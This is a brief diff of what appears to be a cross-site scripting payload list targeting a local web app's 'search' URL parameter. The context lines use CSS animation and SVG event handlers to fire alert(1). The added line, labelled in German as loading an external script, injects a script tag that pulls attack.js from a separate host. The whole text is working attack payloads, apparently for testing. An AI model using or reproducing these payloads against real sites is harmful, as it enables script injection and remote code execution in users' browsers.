@@ -6,3 +6,6 @@ http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation
 http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
 http://localhost:4200/?search=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
 http://localhost:4200/?search=<svg><animate onend=alert(1) attributeName=x dur=1s>
+
+# Lädt externes Skript
+http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);"></xss>
